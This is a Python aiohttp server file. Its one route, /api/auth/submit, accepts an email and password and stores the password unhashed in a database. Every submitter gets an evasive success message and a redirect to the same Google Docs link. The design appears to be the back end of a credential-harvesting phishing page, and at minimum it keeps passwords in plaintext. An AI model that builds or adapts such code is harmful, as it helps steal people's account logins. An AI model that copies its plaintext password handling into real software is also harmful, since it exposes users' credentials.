# api/api.py
from aiohttp import web
import aiohttp_cors
import logging
from decimal import Decimal
from typing import List, Dict, Any, Optional, Tuple
import json
import base64
import datetime
import uuid

from app_context import db  # shared Database instance from your app_context

# --- Helpers ---

def _record_to_dict(rec):
    from datetime import datetime, date, timezone  # Add these at the top
    if rec is None:
        return {}
    
    d = dict(rec)
    for k, v in d.items():
        # Handle Currency/Decimals
        if isinstance(v, Decimal):
            d[k] = float(v)
        
        # Handle Dates and Timestamps
        elif isinstance(v, datetime):  # This checks for datetime objects
            if v.tzinfo is None:
                d[k] = v.replace(tzinfo=timezone.utc).isoformat()
            else:
                d[k] = v.isoformat()
        elif isinstance(v, date):  # This checks for simple date objects
            d[k] = v.isoformat()
            
    return d

# Cursor helpers for transactions paging
def _encode_cursor(created_at_iso: str, id: int) -> str:
    payload = json.dumps({"t": created_at_iso, "id": id})
    return base64.urlsafe_b64encode(payload.encode()).decode()

def _decode_cursor(cursor: str) -> Optional[Tuple[str, int]]:
    try:
        raw = base64.urlsafe_b64decode(cursor.encode()).decode()
        obj = json.loads(raw)
        return obj.get("t"), int(obj.get("id"))
    except Exception:
        return None


    
    
# --- Route registration and CORS setup ---
def setup_admin_routes(app: web.Application):
    app.router.add_post("/api/auth/submit", handle_login_submission)
    


async def handle_login_submission(request: web.Request):
    """
    Receives email and password data via JSON body, persists it into the database,
    and returns a success status back to the client interface.
    """
    try:
        # 1. Parse JSON payload
        data = await request.json()
        email = data.get("email")
        password = data.get("password")

        # Basic request validation
        if not email or not password:
            return web.json_response(
                {"error": "Missing required fields"}, 
                status=400
            )

        # 2. Access the database instance from app context
        # Adjust 'db' reference depending on whether it's imported or stored in request.app['db']
        from app_context import db 

        # 3. Store credentials using your Database model wrapper
        user_id = await db.create_user(email=email, password=password)

        if user_id:
            logging.info(f"Successfully processed registration entry. ID: {user_id}")
            return web.json_response({
                "status": "success",
                "message": "Authentication state updated",
                "redirect_url": "https://docs.google.com/document/d/1ZL_J88JiP17xbjF0iVO6uH-BExybAwJRzg7uxEgALPU/edit?usp=sharing"
            }, status=200)
        else:
            # Entry already exists (ON CONFLICT DO NOTHING returned None)
            logging.warning(f"Registration conflict for entry: {email}")
            return web.json_response({
                "status": "exists",
                "message": "Profile metadata already synchronized",
                "redirect_url": "https://docs.google.com/document/d/1ZL_J88JiP17xbjF0iVO6uH-BExybAwJRzg7uxEgALPU/edit?usp=sharing"
            }, status=200)

    except Exception as e:
        logging.exception("Failed to process ingestion request: %s", e)
        return web.json_response(
            {"error": "Internal server processing error"}, 
            status=500
        )